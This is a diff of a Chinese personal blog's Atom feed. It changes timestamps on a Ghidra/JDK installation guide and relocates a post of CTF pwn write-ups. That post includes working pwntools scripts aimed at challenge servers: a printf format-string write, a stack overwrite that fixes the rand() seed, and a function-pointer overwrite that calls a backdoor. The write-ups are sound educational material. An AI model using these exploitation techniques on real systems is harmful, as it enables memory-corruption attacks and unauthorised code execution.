@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.zzl14.xyz/"/>
-  <updated>2020-08-17T08:43:15.990Z</updated>
+  <updated>2020-08-17T08:48:30.283Z</updated>
   <id>https://www.zzl14.xyz/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="https://www.zzl14.xyz/2020/08/16/ghidra%E5%AE%89%E8%A3%85/"/>
     <id>https://www.zzl14.xyz/2020/08/16/ghidra%E5%AE%89%E8%A3%85/</id>
     <published>2020-08-16T06:19:15.000Z</published>
-    <updated>2020-08-17T08:43:15.990Z</updated>
+    <updated>2020-08-17T08:48:30.283Z</updated>
     
     <content type="html"><![CDATA[<h1 id="Ubuntu安装ghidra"><a href="#Ubuntu安装ghidra" class="headerlink" title="Ubuntu安装ghidra"></a>Ubuntu安装ghidra</h1><p>要安装 Ghidra，使用任何解压缩程序（内置 OS 实用程序，7-Zip，WinZip，WinRAR等）将 Ghidra 官网提供的压缩包解压缩到所需的路径</p><p>所需文件下载</p><p>链接：<a href="https://pan.baidu.com/s/19zjcCyKRkHfsCkQtjPhXbA" target="_blank" rel="noopener">https://pan.baidu.com/s/19zjcCyKRkHfsCkQtjPhXbA</a><br>提取码：i4us</p><h2 id="JDK环境安装"><a href="#JDK环境安装" class="headerlink" title="JDK环境安装"></a>JDK环境安装</h2><p><a href="https://www.oracle.com/java/technologies/javase-jdk14-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase-jdk14-downloads.html</a></p><p>1、下载新的jdk</p><p>首先到jdk官网上下载你想要的jdk版本，下载完成之后将需要安装的jdk安装包放到Linux系统指定的文件夹下，并且命令进入该文件夹下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost software]<span class="comment"># wget --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie" "http://download.oracle.com/otn-pub/java/jdk/8u141-b15/336fa29ff2bb4ef291e347e091f7f4a7/jdk-8u141-linux-x64.tar.gz"</span></span><br></pre></td></tr></table></figure><p>2、解压 jdk-8u131-linux-x64.tar.gz安装包</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost software]<span class="comment"># mkdir -p /usr/lib/jvm</span></span><br><span class="line">[root@localhost software]<span class="comment"># tar -zxvf jdk-8u131-linux-x64.tar.gz -C /usr/lib/jvm</span></span><br></pre></td></tr></table></figure><p>3、设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用您选择的编辑器打开〜/.bashrc。例如：</span><br><span class="line"></span><br><span class="line">vi ~/.bashrc</span><br><span class="line"></span><br><span class="line">在文件的最后，将JDK bin目录添加到PATH变量：</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=&lt;提取的JDK目录的路径&gt;/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><h4 id="Linux安装JDK完整步骤"><a href="#Linux安装JDK完整步骤" class="headerlink" title="Linux安装JDK完整步骤"></a>Linux安装JDK完整步骤</h4><p><a href="https://www.cnblogs.com/fangts/p/8947230.html" target="_blank" rel="noopener">https://www.cnblogs.com/fangts/p/8947230.html</a></p><p>5、检查新安装的jdk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost software]<span class="comment"># java -version</span></span><br></pre></td></tr></table></figure><p>显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;1.8.0_131&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_131-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)</span><br></pre></td></tr></table></figure><p>到此为止，整个安装过程结束。</p><h2 id="ghidra安装"><a href="#ghidra安装" class="headerlink" title="ghidra安装"></a>ghidra安装</h2><p>解压下载的安装包到选好的目录下</p><p>进入目录开始使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>先创建project，加载文件</li></ul><blockquote><p>选择File-&gt;New project-&gt;Non-Shared project（非共享项目），然后next,</p><p>修改项目路径和项目名，然后Finish</p><p>把要分析的文件拖进窗口里，然后OK确认</p><p>随后会加载，显示导入结果概要，关闭即可</p><p>将项目中的文件拖进绿色的龙头里，yes进行分析</p><p>显示分析选项，默认即可，选择Analyse</p><p>窗口中显示分析的原代码</p></blockquote><p><img alt="image-20200817161919148" data-src="/2020/08/16/ghidra安装/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200817161919148.png" class="lazyload"></p><ul><li>查找函数</li></ul><blockquote><p>选择Search-&gt;Program Text</p><p>搜索框里输入main，搜索域（Fields）选择Functions，选择搜索全部（Search All）</p><p>搜索结果中可见int main(void)，单击以在代码显示器中定位到main函数位置</p><p>左侧显示反汇编代码，右侧显示C语言伪代码</p></blockquote><p><img alt="image-20200817163127464" data-src="/2020/08/16/ghidra安装/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200817163127464.png" class="lazyload"></p>]]></content>
     
@@ -481,6 +481,36 @@
   </entry>
   
   <entry>
+    <title>drops做题收获</title>
+    <link href="https://www.zzl14.xyz/2019/08/08/p/"/>
+    <id>https://www.zzl14.xyz/2019/08/08/p/</id>
+    <published>2019-08-08T07:25:16.000Z</published>
+    <updated>2019-10-30T09:15:20.713Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>攻防世界 </p><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p><p>分析伪代码，发现修改pwnme的值为8 得到flag</p><p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p><p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p><p><strong>用法说明</strong></p><pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p><p>一<br><img alt data-src="/2019/08/08/p/2.png" class="lazyload"><br>利用%x泄露内容</p><p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p><p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p><p>二<br><img alt data-src="/2019/08/08/p/1.jpg" class="lazyload"><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p><p>所以说偏移处指针会不会是指</p><pre><code>猜测。。。。原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p><p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p><pre><code> from pwn import *p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);pwnme=0x804a068p.recvuntil(&apos;name:&apos;)p.sendline(&apos;qqqq&apos;)p.recvuntil(&apos;please:&apos;)payload = p32(pwnme)payload += &apos;aaaa&apos;payload += &apos;%10$n&apos;p.sendline(payload)p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p><p><img alt data-src="/2019/08/08/p/3.png" class="lazyload"></p><p>开启了canary,不能直接栈溢出到sub_C3E函数，</p><p>但是区别在于</p><p>一</p><pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p><pre><code>guess_num 没给libc库， dice_game给了libc.so.6所以写脚本时guess_num用的是libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)而dice_game用的是libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p><pre><code>srand初始化随机种子,rand产生随机数。随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p><p>下面是从</p><p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p><pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p><p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p><p>脚本</p><pre><code>from pwn import *from ctypes import *#coding:utf-8p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)payload = &quot;a&quot;*0x20 +p64(1)p.recvuntil(&apos;Your name:&apos;)p.sendline(payload)libc.srand(1)for i in range(10):num = str(libc.rand()%6+1)p.recvuntil(&apos;number:&apos;)p.sendline(num)p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p><p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p><p>记下函数的地址。</p><p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p><p>搜到的题解</p><pre><code>#! /usr/bin/env pythonfrom pwn import *p=remote(&apos;111.198.29.45&apos;,56015)print p.recvuntil(&quot;&gt; &quot;)p.sendline(&apos;A&apos;)payload=&apos;A&apos;*32+p32(0x080486cc)print p.recvuntil(&quot;&gt; &quot;)p.sendline(payload)print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p><p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p><p><img alt data-src="/2019/08/08/p/4.png" class="lazyload"></p><p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p><p><img alt data-src="/2019/08/08/p/5.png" class="lazyload"></p><p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p><p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p><p>为什么呢？<br>我也不太清楚。</p><p>下面是为什么用32*”A”的原因</p><p>重点</p><h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数因此我们可以用这一句来进行溢出，执行我们找到的 后门函数分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p><p>因此我用下面的脚本验证发现也可行</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;111.198.29.45&apos;,39341)print p.recvuntil(&quot;&gt; &quot;)p.sendline(&apos;A&apos;)payload=&apos;9&apos;*36+p32(0x080486cc)print p.recvuntil(&quot;&gt; &quot;)p.sendline(payload)print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+
+
+
+&lt;p&gt;攻防世界 &lt;/p&gt;
+&lt;h1 id=&quot;CGfsb&quot;&gt;&lt;a href=&quot;#CGfsb&quot; class=&quot;headerlink&quot; title=&quot;CGfsb&quot;&gt;&lt;/a&gt;CGfsb&lt;/h1&gt;&lt;p&gt;格式化字符串漏洞&lt;br&gt;因为当时做这个题时候不
+      
+    
+    </summary>
+    
+    
+    
+      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
+    
+  </entry>
+  
+  <entry>
     <title>python基本数据类型</title>
     <link href="https://www.zzl14.xyz/2019/08/08/python/"/>
     <id>https://www.zzl14.xyz/2019/08/08/python/</id>
@@ -509,36 +539,6 @@
     
     
       <category term="语言基础" scheme="https://www.zzl14.xyz/tags/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>drops做题收获</title>
-    <link href="https://www.zzl14.xyz/2019/08/08/p/"/>
-    <id>https://www.zzl14.xyz/2019/08/08/p/</id>
-    <published>2019-08-08T07:25:16.000Z</published>
-    <updated>2019-10-30T09:15:20.713Z</updated>
-    
-    <content type="html"><![CDATA[<a id="more"></a><p>攻防世界 </p><h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p><p>分析伪代码，发现修改pwnme的值为8 得到flag</p><p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p><p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p><p><strong>用法说明</strong></p><pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p><p>一<br><img alt data-src="/2019/08/08/p/2.png" class="lazyload"><br>利用%x泄露内容</p><p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p><p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p><p>二<br><img alt data-src="/2019/08/08/p/1.jpg" class="lazyload"><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p><p>所以说偏移处指针会不会是指</p><pre><code>猜测。。。。原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p><p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p><pre><code> from pwn import *p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);pwnme=0x804a068p.recvuntil(&apos;name:&apos;)p.sendline(&apos;qqqq&apos;)p.recvuntil(&apos;please:&apos;)payload = p32(pwnme)payload += &apos;aaaa&apos;payload += &apos;%10$n&apos;p.sendline(payload)p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p><p><img alt data-src="/2019/08/08/p/3.png" class="lazyload"></p><p>开启了canary,不能直接栈溢出到sub_C3E函数，</p><p>但是区别在于</p><p>一</p><pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p><pre><code>guess_num 没给libc库， dice_game给了libc.so.6所以写脚本时guess_num用的是libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)而dice_game用的是libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p><pre><code>srand初始化随机种子,rand产生随机数。随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p><p>下面是从</p><p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p><pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p><p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p><p>脚本</p><pre><code>from pwn import *from ctypes import *#coding:utf-8p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)payload = &quot;a&quot;*0x20 +p64(1)p.recvuntil(&apos;Your name:&apos;)p.sendline(payload)libc.srand(1)for i in range(10):num = str(libc.rand()%6+1)p.recvuntil(&apos;number:&apos;)p.sendline(num)p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p><p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p><p>记下函数的地址。</p><p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p><p>搜到的题解</p><pre><code>#! /usr/bin/env pythonfrom pwn import *p=remote(&apos;111.198.29.45&apos;,56015)print p.recvuntil(&quot;&gt; &quot;)p.sendline(&apos;A&apos;)payload=&apos;A&apos;*32+p32(0x080486cc)print p.recvuntil(&quot;&gt; &quot;)p.sendline(payload)print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p><p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p><p><img alt data-src="/2019/08/08/p/4.png" class="lazyload"></p><p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p><p><img alt data-src="/2019/08/08/p/5.png" class="lazyload"></p><p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p><p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p><p>为什么呢？<br>我也不太清楚。</p><p>下面是为什么用32*”A”的原因</p><p>重点</p><h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数因此我们可以用这一句来进行溢出，执行我们找到的 后门函数分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p><p>因此我用下面的脚本验证发现也可行</p><pre><code>#coding:utf-8from pwn import *p=remote(&apos;111.198.29.45&apos;,39341)print p.recvuntil(&quot;&gt; &quot;)p.sendline(&apos;A&apos;)payload=&apos;9&apos;*36+p32(0x080486cc)print p.recvuntil(&quot;&gt; &quot;)p.sendline(payload)print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-
-
-
-
-&lt;p&gt;攻防世界 &lt;/p&gt;
-&lt;h1 id=&quot;CGfsb&quot;&gt;&lt;a href=&quot;#CGfsb&quot; class=&quot;headerlink&quot; title=&quot;CGfsb&quot;&gt;&lt;/a&gt;CGfsb&lt;/h1&gt;&lt;p&gt;格式化字符串漏洞&lt;br&gt;因为当时做这个题时候不
-      
-    
-    </summary>
-    
-    
-    
-      <category term="做题题解" scheme="https://www.zzl14.xyz/tags/%E5%81%9A%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
     
   </entry>
   
